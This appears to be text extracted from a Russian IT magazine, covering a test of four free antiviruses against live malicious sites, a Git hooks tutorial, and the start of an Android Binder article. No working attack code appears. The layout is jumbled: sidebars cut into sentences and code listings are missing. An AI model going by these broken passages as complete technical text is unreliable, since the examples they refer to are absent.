показателей активности, GPS-координат, то становится немного не по себе.
Например, страховые агентства, обладающие информацией о том, что ты лю-
бишь скоростную езду и частенько посещаешь бары, могут увеличить стои-
мость страховки твоего авто без объяснения причин.





Ключевые этапы процесса фингерпринтинга

В своем материале «Угрозы трекинга показателей здоровья» я делал пред-
положение о появлении специального вредоносного кода для носимой элек-
троники, который будет в фоновом режиме снимать показатели с сенсоров
устройства, прямо или косвенно мониторящих состояние твоего организма,
и отправлять эти данные третьей стороне. Уникальный фингерпринт сенсоров
может стать отличным дополнением к данной информации.

И НЕ НУЖЕН ЗАНАВЕС
ЖЕЛЕЗНЫЙ
Интересное наблюдение: региональная спец-
ифика часто не выползает за пределы своих
территорий и без всяких запретительных ини-
циатив со стороны государства. Это касается
и исследований в сфере информационной без-
опасности: достаточно большое число толковых
ресерчей остаются опубликованными в пре-
делах одной территории и, увы, не слышны на
громких мейнстримовых конференциях. Этим и
примечательны небольшие региональные кон-
ференции с «местной» спецификой и с местным
образом мыслей, который приводит к уникаль-
ным результатам.                                        Opppa... Gangnam style
MALWARE
БЕСПЛАТНЫЕ
                              НАСКОЛЬКО
                           ХОРОШИ
                               БЕСПЛАТНЫЕАНТИВИРУСЫ —
                               АНТИВИРУСЫ
                             И ПОЧЕМУ ОНИ
                               БЕСПЛАТНЫ?ПРОВЕРКА БОЕМ





     84ckf1r3
 84ckf1r3@gmail.com
Многие разработчики защитных программ выпускают
бесплатные антивирусы. В этом году даже ЗАО «Ла-
боратория Касперского» представила халявный ва-
риант — Kaspersky Free. Насколько базовых функций
достаточно для предотвращения заражения в реаль-
ных условиях — например, при веб-серфинге? Чем
приходится расплачиваться за бесплатный сыр? Да-
вай выясним это.

МЕТОДИКА ТЕСТИРОВАНИЯ
Всем участникам эксперимента мы обеспечили максимально идентичные усло-
вия. Средствами VirtualBox была создана тестовая система — виртуальная ма-
шина с чистой ОС Windows 7 в редакции «Максимальная» с первым сервис-па-
ком и всеми обновлениями. Затем ее трижды клонировали и в каждый из клонов
установили только один антивирус. Анализ изменений и текущей активности
проводился портейбл-софтом (TCPView, Autoruns с плагином VirusTotal через
API, ProcessExplorer, Regshot, AVZ и другими утилитами из аптечки сисадмина).
   Источниками угроз послужили сайты из базы Clean MX, помеченные как за-
раженные и/или потенциально опасные. Для теста отбирались только активные
сайты, добавленные за последние сутки. Мы их по очереди посещали через
браузер IE и протоколировали результаты срабатывания антивирусов (если они
были). На время теста антивирус и файрвол в хост-системе были отключены.

KASPERSKY FREE
Объем дистрибутива версии 16.0.1.445
составляет 147,8 Мбайт. После уста-
новки и обновления Kaspersky Free за-
нимает на диске 232 Мбайт. Он обе-
спечивает базовую защиту, в которую
входят антивирусный сканер, резидент-
ный монитор, автоматическое обновле-
ние, средства управления карантином
и просмотра отчетов. Дополнительные
функции отмечены как неактивные —
это своеобразная реклама полной вер-
сии KIS и KTS.                         Модули Kaspersky Free
При первом запуске на главной странице антивируса появляется полнораз-
мерное окошко с предложением регистрации. Можно кликнуть на неприметную
кнопку с изображением шестеренки в левом нижнем углу, и оно исчезнет. Прав-
да, потом напоминание о регистрации будет постоянно появляться снова в виде
всплывающих сообщений. Дополнительно при первом запуске в браузере по
умолчанию открывается страничка магазина Google Play с предложением уста-
новить Kaspersky Internet Security, а в сам браузер встраивается Kaspersky
Protection Toolbar. Отказаться от его интеграции на этапе установки невозмож-
но — в инсталляторе просто нет никаких настроек. Однако тулбар можно де-
зактивировать средствами самого браузера.





Kaspersky Free заблокировал доступ к зараженному сайту

В нашем тесте Kaspersky Free не пропустил ни одной реальной угрозы. Часть
вредоносных сайтов блокировалась фильтром Microsoft SmartScreen, а доступ
к другим запрещал антивирус. Иногда они срабатывали одновременно.
                                                          Одновременное
                                                            срабатывание
                                                               Kaspersky Free и MS
                                                             SmartScreen





Однако антивирус недостаточно жестко мешает пользователю «выстрелить
себе в ногу». Если выбрать в списке загрузок ранее заблокированный смарт-
скрином потенциально опасный экзешник и запустить его принудительно,
Kaspersky Free позволит это сделать с буддистским равнодушием. Он разре-
шает установку программы с недействительной цифровой подписью, на кото-
рую ругаются 17 антивирусов онлайн-сканера VirusTotal.





Kaspersky Free разрешает локальный запуск программы, на которую ругается онлайн
Причем сам Kaspersky распознает его на VirusTotal как Downloader.Win32.Bundl.
aq, но игнорирует при локальной проверке бесплатной версией. Пусть это и не
вирус, а средство доставки «боевой нагрузки», пользователю от этого не легче.

AVIRA FREE ANTIVIRUS 2016
Антивирус Avira Free также имеет ограниченную функциональность и довольно
назойливо рекламирует переход на платную версию. Реклама различных про-
дуктов Avira сыпется как из рога изобилия еще во время установки веб-инстал-
лятором. Наверное, поэтому она была чертовски долгой. Устав наблюдать за
индикатором прогресса, я успел дописать другую статью.

                                                            Длительность уста-
                                                           новки Avira бьет все
                                                          рекорды





После установки Avira заняла 1329 Мбайт вместе с базами, причем только по-
ловина этого места приходилась на каталог \Program Files\Avira\. Осталь-
ное было в \ProgramData\Avira и других местах. В состав Avira Free входит
программный файрвол (что редкость для бесплатных антивирусов), но его на-
личие не объясняет столь высоких аппетитов к дисковому пространству.
  Сам интерфейс тоже вызывает удивление. Вся установка отображается
по-русски. После нажатия на иконку в трее язык превращается в русско-ан-
глийский, а в главном окне становится просто английским. Не беда, но странно
видеть такую поверхностную локализацию.
                                                          Интерфейс Avira Free





Исполняемый файл с Downloader.Win32.Bundl.aq антивирус позволил скачать.
При его принудительном запуске появилось сообщение о том, что файл анализи-
руется Avira. Спустя несколько секунд он опрометчиво был признан безопасным.

                                                           Ложноотрицатель-
                                                            ное срабатывание
                                                                        Avira
Обнаружив вредоносный js-скрипт, Avira показала предупреждение. По случай-
ности оно совпало с оформлением сайта и выглядело как его часть — неопыт-
ный пользователь может не заметить.

                                                          Ненавязчивые сооб-
                                                      щения Avira





После нажатия Remove скрипт был заблокирован и редиректа на фишинговую
страницу не произошло. Затем Avira сразу запустила быстрое сканирование
системы — считаю, это оправданная дополнительная мера.
   Упакованные в ZIP зловреды Avira тоже сперва не заметила и обнаружила
лишь после ручной распаковки архива.

                                                                        Avira не проверила
                                                           скачанный ZIP до его
                                                            открытия
После принудительной загрузки заблокированного смартскрином исполняе-
мого файла Avira определила, что он относится к категории PUA (потенциально
нежелательных программ).

                                                                        Avira обнаружила
                                                    PUA





При попытке перехода на страницу, содержащую несколько эксплоитов, Avira
сразу показывает предупреждение, но позволяет загрузить контент. Зараже-
ния при этом не происходит.

                                                                        Avira блокирует
                                                           отдельные эле-
                                                        менты зараженных
                                                              веб-страниц
Так же как и Kaspersky Free, иногда антивирус Avira срабатывал вместе с филь-
тром SmartScreen.





Совместная блокировка Avira и MSS

AVG ANTIVIRUS FREE EDITION
Чешский антивирус AVG претерпел су-
щественные изменения с осени про-
шлого года. Сейчас это фактически
утилита для сбора данных о пользова-
теле с некоторой антивирусной функ-
циональностью. На диске AVG Free
занимает 192 Мбайт, но эта величина
быстро возрастает по мере кеширова-
ния данных, отправляемых на серверы
компании. По официальной версии, это
делается для облачной проверки и ана-
лиза подозрительных файлов. Вот толь-
ко что можно подозревать в чистой ОС,  Интерфейс AVG Free
где, кроме антивируса AVG Free, нет
никаких сторонних приложений и поль-
зовательских файлов?
  Сама установка проходит быстро и почти без рекламы, но в инсталляторе
есть подвох. На очередном этапе в нем предлагается установить пробную
30-дневную версию платного антивируса вместо изначально выбранного бес-
платного. Надо вручную выбрать AVG Free и продолжить установку.

                                                          Навязывание проб-
                                                           ной версии AVG





Сразу после установки AVG Free во всплывающем окне предлагается инсталли-
ровать тулбар AVG SafeGuard by Ask и сделать Ask поисковиком по умолчанию,
а в браузере открывается страничка с рекламой приложения AVG для Android.
   Потенциально опасный экзешник, который проигнорировал Kaspersky Free,
AVG заблокировал еще при попытке его скачать. Защита от дурака сработала
явно лучше.

                                                        AVG блокирует
                                                                 загрузку опасного
                                                        файла
Другой вредоносный исполняемый файл AVG позволил скачать и лишь потом
распознал в нем угрозу.

                                                        AVG обнаружил ин-
                                                        фицированный файл





При этом вредоносные файлы в архиве ZIP были обнаружены AVG только после
ручной распаковки архива.

                                                        AVG не дружит
                                                                    с архивами





На веб-страницах часто встречаются вредоносные js-скрипты, которые пытают-
ся перенаправить пользователя на другую страницу или заразить его компью-
тер. AVG их обнаруживает и выводит запрос о блокировке, но после сообще-
ния «угроза успешно удалена» все равно происходит редирект на фишинговый
сайт, который уже блокируется средствами SmartScreen... если повезет.
   Иногда на сайтах встречается сразу несколько угроз. В таком случае AVG
показывает суммарную информацию и обычно предлагает выбрать желаемое
действие. Иногда он запрещает все элементы сам. В таком случае действия не
требуются — можно лишь просмотреть описание найденной заразы.

                                                        AVG нашел
                                                            эксплоиты





Одну из веб-страниц, которую считают зараженной шесть антивирусов на
VirusTotal, AVG проигнорировал. Он обнаружил заразу, лишь когда она оказа-
лась на жестком диске и пыталась активизироваться.

                                                        AVG среагировал
                                                                    с опозданием
AVAST! FREE ANTIVIRUS (11.1.2245)
При установке Avast! также надо быть внимательным: по умолчанию отмече-
на установка Google Chrome и Google Toolbar для IE. После установки без до-
полнительных компонентов антивирус занимает 604 Мбайт — много, но вдвое
меньше Avira Free.
   Скрытой рекламы полно даже в главном окне антивируса. Обещанный по-
дарок оказывается формальной скидкой на платные продукты. На вкладке «Ин-
струменты» указаны не дополнительные модули защиты, а рекламные ссылки
на их описание. Стоит кликнуть одну из них, как предложение выбрать вариант
дополнительной платной защиты надолго поселится в главном окне Avast.
  При попытке вручную запустить заблокированный MSS экзешник со сторо-
ны Avast! не встречаем никакого сопротивления. Потенциально опасный файл
(даунлоадер) с недействительной подписью игнорируется антивирусом.

                                                                         Avast! не считает
                                                       файл опасным, и зря





Вредоносный js-скрипт и эксплоиты Avast! блокирует сразу, при этом заражен-
ные веб-страницы не загружаются вообще. Однако сообщение о найденных
угрозах выглядит неинформативно — оно одинаковое для разных зловредов и
не позволяет даже судить об их количестве.
                                                                                 Avast! забло-
                                                                  кировал JS





Архив со зловредами Avast! позволил скачать, но проверил его самостоятельно
и сразу обнаружил угрозу — еще до моей попытки посмотреть список загрузок.

                                                                                Avast! рас-
                                                                  познал угро-
                                                                             зу в архиве
Еще один исполняемый файл, который на VirusTotal детектируют как вредонос-
ный 34 антивируса, Avast! проигнорировал. Он молча позволил скачать и при-
нудительно запустить его, обходя блокировку MSS.

                                                                         Avast! пропустил
                                                          вредоносный объект





                                                        INFO

                                                                      Все тесты проводи-
                                                                            лись в настройках по
                                                                          умолчанию. Любой
                                                                              антивирус лишь
                                                                          снижает вероятность
                                                                              заражения, но не
                                                                           исключает ее полно-
                                                                               стью. Для повышения
                                                                            безопасности сле-
                                                                                дует использовать
СЛЕДЫ БОЛЬШОГО БРАТА                                    более агрессив-
                                                                       ные настройкиС подачи Microsoft, выпустившей «Шпиокна 10», практика                                                                        и дополнительные
открытой слежки за пользователями становится у софт-                                                                            инструменты —
мейкеров общепринятой. Она прямо указывается в поль-     файрвол, средства
зовательском соглашении, но кто же его читает? Напри-    проактивной защиты,
                                                                           изоляции потен-
мер, у Avira этот пункт выглядит так:                                                                           циально опасного
  «Мы можем собирать, хранить и использовать данные,      кода, антифишинг
позволяющие установить вашу личность, ваше устройство     и другие. В платных
                                                                              антивирусах боль-(как определено ниже) и взаимодействие вашего устрой-                                                                        шинство из них уже
ства с другими устройствами (например, ID устройства,       интегрировано,
IP-адрес устройства, место, контент, языковые предпо-     однако при желании
                                                                  можно самостоятель-чтения, IMEI-код устройства, бренд и модель устройства,
                                                                         но сделать подобный
статус батареи, версию ОС устройства, номер телефона                                                                        набор из бесплатных
устройства, номер SIM, имя сетевого провайдера, статус            утилит.
памяти, геоинформацию на основании местоположения
по GPS/Wi-Fi/сеть и любые другие технические сведения... Некоторая часть
этой информации может использоваться для вашей идентификации, включая,
без ограничения: имя, адрес, номер телефона, адрес email, номер карточ-
ки социального страхования, информацию о кредитной карте, изображение
лица, образец голоса или биометрические данные (все вместе «Личная ин-
формация») и может включать в себя данные, хранящиеся на вашем устрой-
стве. Мы также можем передавать вашу личную информацию в другие страны,
где расположено оборудование провайдеров нашего продукта».
   У других разработчиков формулировки немного отличаются, но общий прин-
цип остается прежним. Они собирают все данные, которые технически возмож-
но получить. Поскольку антивирус глубоко интегрируется в ОС, устанавливает
собственные драйверы и перехватывает системные вызовы, он имеет доступ ко
всей информации — в том числе зашифрованной, поскольку ее хотя бы раз рас-
шифровывал сам пользователь.
  На этом фоне обнадеживает заявление Евгения Касперского, которое он
сделал, анонсируя выпуск бесплатного антивируса имени себя: «Он будет по-
строен на тех же технологиях, что и платные персональные продукты... Без
слежки за пользователем в рекламных целях и торговли его конфиденциаль-
ностью. Никакой такой фигни — только защита», — писал он в ЖЖ.
   Впрочем, и здесь не обходится без доли лукавства. Сам Kaspersky Free соби-
рает только общую обезличенную статистику, вроде количества найденных угроз
по их типам. Однако в нем по умолчанию включен облачный сервис Kaspersky
Security Network, а KSN известен своими аппетитами к сбору информации. В него
отправляются подробные логи, которые включают список установленных про-
грамм вместе с путями, детальный мониторинг работы пользователя, списки за-
пущенных процессов, статистику использования приложений и другие приват-
ные данные. Отключить его можно на соответствующей вкладке.

                                                         Тайный агент KSN





                                                DANGER

                                                                          Как и любые программы,
                                                                  менеджеры виртуальных
                                                                машин тоже содержат
                                                                          ошибки. Используя
                                                                        различные уязвимости,
                                                                       зловреды могут выйти за
                                                                     пределы тестовой систе-
                                                          мы и заразить основную
                                                                                операционку.
ВЫВОДЫ
Как видно из этого небольшого эксперимента, все антиви-
русы реагировали на одни и те же угрозы немного по-раз-
ному. Одни блокировали переход по ссылке, отобразив
предупреждение на раннем этапе. Другие не дали скачать
зараженный файл или предотвратили запуск вредоносно-
го скрипта, а третьи среагировали только на локальный за-    WWW
пуск зловреда или вообще пропустили его. Дело здесь не                                                                                 Kaspersky Free
в том, что платный антивирус лучше бесплатного от того же
разработчика — у них одинаковый движок и базы. Просто    Avira Free Antivirus 2016
в платных версиях используются дополнительные модули
                                                                 AVG AntiVirus FREE
защиты, благодаря которым угрозы распознаются и бло-
кируются не только по сигнатурному анализу.                         Avast! Free Antivirus
   Kaspersky Free в целом не вызвал существенных наре-
каний. Он очень похож на урезанный KIS, из которого убра-
ли опциональные компоненты и защиту от дурака, добавив
рекламы и спрятав поглубже KSN.
   Avira отличилась чудовищно долгой установкой и про-
жорливостью. Она занимала больше всех места, а ком-
пьютер с ней ощутимо тормозил на элементарных опера-
циях. С архивами она практически не работает. Во всяком
случае, не проверяет скачанные из интернета до их ручной                                               WARNING
распаковки.
   Avast! проигнорировал пару серьезных угроз (пользова-   Все тесты выполнялись
телю хватит и одной) и тоже изобилует хитрой рекламой.   только в исследователь-
                                                                               ских целях. Необходи-
Обнаруживаемые зловреды он блокирует сразу, но понять,                                                              мые файлы были загру-
что произошло, без детального анализа лога невозможно.   жены с общедоступных
Сообщения антивируса выглядят однотипно и не подра-   ресурсов. Разработчики
                                                                            протестированныхзумевают выбора со стороны пользователя — обычно это                                                                           антивирусов получили
просто уведомления о принятом решении.                         автоматические уве-
  AVG в целом выглядит адекватно, однако политика ком-   домления о результатах
                                                                           сканирования. Редакцияпании в отношении данных пользователя оставляет желать
                                                                      и автор не несут ответ-
лучшего. Если бы не ультиматум о сборе сведений, его                                                                             ственности за любой
можно было бы рекомендовать как неплохой бесплатный      возможный вред.
антивирус.
КОДИНГ
ЧЕРНАЯ
МАГИЯ
GIT HOOK
КАК НЕ ПУСТИТЬ
ДЖУНИОРОВ
В МАСТЕР-ВЕТКУ
И ВООБЩЕ ВСЕ
АВТОМАТИЗИ-
РОВАТЬ
При code review ты указываешь разработ-
чикам на забытые printf, console.log?
С ужасом видишь код с синтаксической
ошибкой? Или хочешь разграничить права        Никита Арыков,
                                                                                   Pushwoosh, Inc.
                                                                                                       nikita.arykov@gmail.comна работу с ветками (как в Bitbucket),
потому что джуниор путает порядок
веток при слиянии? Хватит это терпеть!
У нас же есть Git и Bash!

                                                                                        git push --force





ЛЕГКИЙ СТАРТ С GIT HOOKS
У систем контроля версий есть механизм хуков — скрипты-callback’и, запуска-
емые Git, когда происходит определенное действие. В некотором смысле это
шаблон Observer из ООП.
  В качестве действия могут выступать commit, apply  patch, merge, push,
rebase и другие операции Git. Многие думают, что хук можно использовать
только для проверки формата commit message, но их область применения
ограничена только твоей ленью и/или фантазией. Примеры в статье написаны
для Git, но по аналогии можно сделать и для других систем контроля версий —
Subversion, Mercurial, Bazaar.

Теория хуков
Хуки бывают двух типов:
•  Клиентские — находятся на машине конечного контрибьютора (developer,
    lieutenant, dictator).
     Каждый контрибьютор настраивает хуки только для себя в своей копии
   существующего репозитория, и они не повлияют на других контрибьюторов.
     Для того чтобы добавить хук, достаточно изменить файл в директории
   $PROJECT_DIR/.git/hooks/. Изменение в этой директории не может быть за-
   коммичено и будет влиять только на текущего пользователя. Такие хуки можно
   игнорировать, используя дополнительный флаг git commit --no-verify.

•  Серверные — хуки, исполняемые угадай где :). Они будут применяться ко
   всем контрибьюторам проекта.
     Для установки такого хука также достаточно изменить файл в директории
   $PROJECT_DIR/hooks/, но делать это нужно в удаленном репозитории. Про-
   пустить исполнение таких хуков нельзя. Также при клонировании репозито-
   рия не получится выкачать хуки, они останутся на удаленном репозитории.
     Писать Git hooks можно на любом скриптовом языке: Python, PHP, Ruby,
   PowerShell и прочих. В статье будет использован Bash.
     Hook уведомляет о результате своего выполнения с помощью кода воз-
   врата, и если хук возвращает код, отличный от 0, то исполнение прервется и
   выполнить операцию (git commit, git push и так далее) не получится.

Встроенные хуки
При создании репозитория командой git init также создаются примеры ху-
ков, которые можно посмотреть в одноименной директории.

$ captain@jolly-roger:/PONY/.git/hooks$ ls
applypatch-msg.sample  post-update.sample  pre-commit.sample
pre-rebase.sample      update.sample       commit-msg.sample
pre-applypatch.sample  pre-push.sample     prepare-commit-msg.sample

Для того чтобы начать их использовать, достаточно ско-
пировать интересующий файл, убрав постфикс .sample
(cp  pre-commit.sample  pre-commit), и убедиться, что
для него выставлены права на исполнение; если нет — вы-
полняем chmod +x pre-commit.

                                                        INFOХУК СЛЕВА, ХУК СПРАВА
С теорией разобрались. Самое время попрактиковаться     Полный список воз-
на реальных примерах.                                          можных видов hooks
                                                                   можно посмотреть на
                                                                            сайте Git или набрав
Запрет на push в ветку                                           в командной строке
Начнем с серверного хука с названием pre-receive, кото-       man githooks.
рый исполняется перед тем, как в удаленном репозитории
зафиксируются изменения, когда разработчик делает git push. Если хук от-
даст код возврата, отличный от 0, то исполнение прервется и зафиксировать
изменения в репозитории не удастся.
   Предположим, что на нашем проекте есть люди (джуниоры), которые не
должны иметь возможность фиксировать изменения в master-ветке, пока не
вникнут в проект.
   Чтобы избавить их от соблазна, можно добавить pre-receive hook с провер-
кой по black-list:





Код получился достаточно простым. В переменную changedBranch записыва-
ется ветка, с которой разработчик хочет произвести изменения. Если имя поль-
зователя находится в массиве blockedUsers, тогда мы возвращаем код воз-
врата 1 и не даем зафиксировать изменения в blessed repository.


                                                             Branch
                                                                  permissions
                                                              в продукте
                                                                       Bitbucket Server
По аналогии можно сделать проверку по white-
list, когда только  у конкретных людей (Release
managers) есть возможность фиксировать измене-
ния в master-ветке. Теперь реализовать фичу branch
permissions продукта Bitbucket Server ты можешь са-
мостоятельно.                                                     INFO

printf shall not pass                                      Неслучайно master-ветку нуж-
                                                                  но защищать от прямого до-Многие  разработчики по-прежнему отлаживают                                                                       ступа всем желающим. Все по-
свои программы, используя технику Print debugging     пулярные branching workflow,
(или, по-научному, Tracing) и часто забывают уда-     будь то gitflow или GitHub flow,
                                                             первым постулатом опреде-лить отладочный код при коммите. Чтобы обезопа-
                                                                      ляют, что master-ветка должна
сить наш blessed repository, можно использовать                                                                  быть всегда готова к релизу на
следующий Git hook (как pre-commit, так и pre-        продакшен сервера.
receive):
Команда git diff --cached --name-only вернет имена всех измененных фай-
лов, в том числе удаленных или переименованных, поэтому в цикле по файлам
у нас есть условие [[ -f $FILE ]], которое проверяет, что файл существует
в системе. Далее грепаем в каждом файле запрещенные фразы. В случае, если
наш любимый программист решит внести свои изменения с отладочным кодом
в репозиторий, его попытка будет предотвращена. А при code review тебе не
нужно будет указывать ему на лишний отладочный код:

$ git commit -m “fix critical bug”
    debug.js contains denied word: console.info(“hm,
    is this dead code?”);
    debug.php contains denied word: var_dump($a);
    Aborting commit due to denied words

Такой вот текст увидит наш бедолага и пойдет удалять отладочные строчки кода.
Если ты пользуешься средой разработки от JetBrains, то тоже увидишь поясня-
ющее сообщение, если hook не пропустит твою операцию.





Сообщение от hook в среде IntelliJ IDEA

Проверка формата commit message
Очень удобно, когда commit message содержит ссылку на задачу из issue
tracker’a, например JIRA. Для этого есть специальный встроенный хук с на-
званием commit-msg, и он может быть как клиентским, так и серверным.
На вход ему подается один аргумент — текст из параметра -m команды
git commit -m «commit message».
   Пусть наш проект называется PONY. Тогда содержимое хука может быть
следующим:
Также мы оставили возможность костылить хотфиксить и сливать ветки. Систе-
ма управления репозиториями GitLab предоставляет графический интерфейс
для проверки формата commit message.





                                                        INFO

                                                                   При желании можно
                                                                              проверить, что такая
                                                                             задача действитель-
                                                                        но существует в JIRA.
                                                                    Или можно добавить
                                                                                 проверку, чтобы
                                                                              указание ссылки на
                                                                           code review было
                                                                              обязательным.


Правила проверки commit message в GitLab


Проверка синтаксиса исходного кода
Бывает так, что ты написал фичу, несколько раз все проверил и успешно про-
гнал unit-тесты, но перед коммитом случайно нажал на клавиатуру, и в код попал
лишний символ. Согласись, неприятно. Следующий хук проверяет синтаксис
PHP, Ruby, Go, поддержку своего любимого языка добавить самостоятельно
не составит труда.
Рассмотрим, как работает данный код. Пусть в staging area находятся два фай-
ла. Первый — t.php со следующим содержимым:
Второй — t.rb с одной строчкой кода:




При попытке зафиксировать изменения Git hook не пропустит синтаксически
неверный код:

$ git commit -m “magic commit message”
    PHP Parse error: parse error in t.php on line 4
    Errors parsing t.php
    t.rb:1: unterminated string meets end of file
    Aborting commit due to files with syntax errors

Также мы сразу увидим, в каких файлах и на каких строках у нас синтаксические
ошибки.

Запуск Jenkins-задач
И наконец, классический пример continuous integration, который стоит рассмо-
треть.
   Допустим, у нас есть проект в Jenkins, который умеет выгружать из репози-
тория последние изменения и запускать сборку проекта, прогон интеграцион-
ных тестов и прочее. Если ты используешь https://jenkins-ci.org/ https://jenkins-
ci.org/ Git plugin для Jenkins, то для запуска сборки достаточно вызвать всего
одну команду

curl https://jenkins.your_company.com/git/notifyCommit?url=
    https://repository.your_company.com/PROJECT

Для этого стоит использовать другой серверный hook с названием post-receive,
который запустится после того, как изменения будут приняты в удаленный ре-
позиторий. Более популярное решение — плагин Build Token Root Plugin, где
процесс аналогичен.

Собираем все вместе
Для того чтобы обеспечить модульность хуков, можно каждый держать в отдель-
ном файле в директории $GIT_DIR/hooks и подключать их в нужном pre-commit
или pre-receive hook.

#!/bin/bash
“$(dirname “$0”)”/check-syntax
“$(dirname “$0”)”/block-debugging-code
“$(dirname “$0”)”/unit-tests

Такой подход облегчит поддержку. Кроме того, тебе будет намного проще от-
ключить какой-то из хуков, закомментировав одну строчку.

ЧТО ДЕЛАТЬ, ЕСЛИ НЕТ ДОСТУПА К УДАЛЕННОМУ
РЕПОЗИТОРИЮ?
В идеале хуки должны быть серверными и применяться ко всем участникам
проекта, но это не всегда бывает возможным. Например, GitHub не позволяет
создавать серверные хуки или у тебя не получается договориться с отделом
системных администраторов насчет предоставления ssh до системы управле-
ния репозиториями. В таком случае придется использовать клиентские хуки
и обеспечить их актуальность на машине каждого разработчика. Чтобы не бе-
гать с флешкой по всем машинам, можно использовать Puppet, либо закомми-
тить hooks в репозиторий и устанавливать их, используя Grunt.

ЧТО ОСТАЛОСЬ ЗА КАДРОМ
Ты можешь использовать Git hooks для автоматизации действий, которые не-
обходимы проекту. Вот еще несколько примеров:
•  Если ты придерживаешься жестких стандартов форматирования исходного
   кода в проекте, то можно по аналогии создать хук, который будет запускать
   php codesniffer, gofmt, pep8 или любую другую утилиту для измененных фай-
   лов. Благодаря этому при code review тебе не придется отправлять код на
   доработку из-за открывающей фигурной скобки не на той строке.
•  Хочешь сделать снапшоты в веб-камере во время коммита? Проект lolcom-
   mits открытым исходным кодом доступен на GitHub. Там же есть небольшая
   галерея.
•  Настоящий граммар-наци может сделать хук, который контролирует пра-
   вописание разработчиков, используя GNU Aspell — бесплатную программу
   для проверки орфографии.

Автоматизируй рутинные действия и освободившееся время трать на более
интересные вещи!
КОДИНГ
ЛОГГЕР ЗВОНКОВ
НА ANDROID
ИЗУЧАЕМ СИСТЕМУ
ОБМЕНА СООБЩЕНИЯМИ

                                                                                     Евгений ЗобнинНА ЖИЗНЕННЫХ ПРИМЕРАХ
                                                                                                    zobnin@gmail.com
Такие приложения, как Tasker и Locale, уже давно ста-
ли одним из главных аргументов в споре поклонников
Android и iOS. Действительно, обычные, не требующие
ни прав root, ни прав администратора приложения,
а позволяют творить со смартфоном такое, что любой
ветеран Linux-скриптинга обзавидуется. Как же они
работают и почему подобных приложений нет в iOS
и других мобильных системах? Все дело в Binder —
IPC/RPC-механизме, пронизывающем весь Android.

ВМЕСТО ВВЕДЕНИЯ
Создатели Android, имея возможность продумать архитектуру ОС с нуля, учи-
тывая современные реалии, закономерно решили изолировать установленные
приложения друг от друга. Так появилась идея использовать песочницы, поэ-
тому Android-приложение: а) имеет доступ только к своему собственному ка-
талогу и (если есть такие полномочия) к SD-карте — не содержащей важных
данных свалке барахла, б) может использовать только заранее оговоренные
возможности ОС (а в Android 6.0 пользователь может отозвать такие полномо-
чия прямо во время работы программы) и в) не имеет права запускать, созда-
вать каналы связи или вызывать методы других приложений.
   Реализовано это все с помощью стандартных прав доступа к файлам
(в Android каждое приложение работает с правами созданного специально для
него пользователя Linux), многочисленных проверок на полномочия доступа
к ресурсам ОС на всех уровнях вплоть до ядра и запуска каждого приложения
в своей собственной виртуальной машине (сейчас ее уже сменил ART, но сути
это не меняет).
  Все эти механизмы отлично работают и выполняют свои функции, но есть
одна проблема: если приложения полностью отрезаны друг от друга, вплоть
до исполнения от имени разных юзеров, то как им общаться и как они долж-
ны взаимодействовать с более привилегированными системными сервисами,
которые суть те же приложения? Ответ на этот вопрос — система сообщений
и вызова процедур Binder, одна из многочисленных находок создателей леген-
дарной BeOS, перекочевавшая в Android.
   Binder похож на механизм COM из Windows, но пронизывает систему от и до.
Фактически вся высокоуровневая часть Android базируется на Binder, позволяя
компонентам системы и приложениям обмениваться данными и передавать
друг другу управление, четко контролируя полномочия компонентов на взаимо-
действие. Binder используется для взаимодействия приложений с графической
подсистемой, с его же помощью происходит запуск и остановка приложений,
«общение» приложений с системными сервисами. Binder используется даже
тогда, когда ты запускаешь новую активность или сервис внутри своего при-
ложения, причем по умолчанию сервис работает в том же процессе, что и ос-
новная часть приложения, но его очень легко вынести в отдельный процесс,
просто добавив одну строку в манифест. Все будет работать так, как и раньше,
и благодарить за это надо Binder.
   Сказанное может показаться тебе несколько странным, и, возможно, ты
впервые слышишь о каком-то магическом Binder, но это благодаря тому, что
Android абстрагирует программиста от прямого общения с этим драйвером (да,
он реализован в ядре и управляется с помощью файла /dev/binder). Но ты точ-
но имел дело с интентами, абстрактной сущностью, построенной поверх Binder.

МАГИЧЕСКИЕ ИНТЕНТЫ
В Android объект класса Intent является абстракцией сообщения Binder и по
большому счету представляет собой способ передачи управления компонен-
там своего или чужого приложения, вне зависимости от того, запущено прило-
жение, к которому относится данный компонент, или нет. Банальнейший при-
мер — запуск активности:





                                                               Процесс обще-
                                                               ния компонен-
                                                                     тов приложения
                                                                  через Binder
Это пример так называемого явного интента. Есть класс SecondActivity, в ко-
тором есть метод OnCreate(), а мы просто говорим системе: «Хочу запустить
активность, реализованную в данном классе». Сообщение уходит, система
его получает, находит метод OnCreate() в классе SecondActivity и запускает
его. Скучно, просто, а местами даже тупо. Но все становится намного инте-
реснее, если использовать неявный интент. Для этого немного изменим наш
пример:





И модифицируем описание активности в манифесте:





Результат будет тот же, а возни намного больше. Однако есть одно очень боль-
шое но: в данном случае мы использовали не имя компонента, который хотим
запустить (SeconActivity), а действие, которое хотим выполнить (com.my.app.
MY_ACTION), а формулировка «Я хочу запустить...» превратилась в «Я хочу вы-
полнить такое-то действие, и мне плевать, кто это сделает». В результате нашу
активность теперь можно запустить из любого другого приложения точно таким
же способом. Все, что нужно, — это указать действие, все остальное система
сделает сама.
  Может показаться, что все это немного бессмысленно и бесполезно, но
взгляни на следующий пример:
Этот простой код позволяет позвонить любому абоненту (при наличии полно-
мочия android.permission.CALL_PHONE), а все благодаря тому, что приложе-
ние Phone умеет обрабатывать действие Intent.ACTION_CALL (точно таким же
способом, как в нашем примере, с помощью intent-filter). Более того, если на
смартфоне установлена сторонняя «звонилка», которая умеет реагировать на
то же действие, система спросит, какое именно приложение использовать для
звонка (а юзер может выбрать вариант, который будет использован в будущем).
   Существует множество стандартных системных действий, которые мо-
гут обрабатывать приложения, например Intent.ACTION_VIEW для открытия
веб-страниц, изображений и других документов, ACTION_SEND для отправки
данных (стандартный диалог «Поделиться»), ACTION_SEARCH и так далее. Плюс
разработчики приложений могут определять свои собственные действия на
манер того, как мы это сделали во втором примере. Но одно действие обяза-
ны обрабатывать все приложения, которые должны иметь иконку на рабочем
столе, — это android.intent.action.MAIN. Среда разработки сама создает
для него intent-filter и указывает MainActivity в качестве получателя. Так что ты
можешь даже не подозревать о том, что твое приложение умеет его обрабаты-
вать, но именно оно позволяет рабочему столу узнать, что на смартфон уста-
новлено твое приложение.
   Однако все это не так уж и интересно, и в этой статье я бы хотел сконцен-
трироваться на другом аспекте интентов и Binder, а именно на широковеща-
тельных сообщениях.

ШИРОКОВЕЩАТЕЛЬНЫЕ СООБЩЕНИЯ
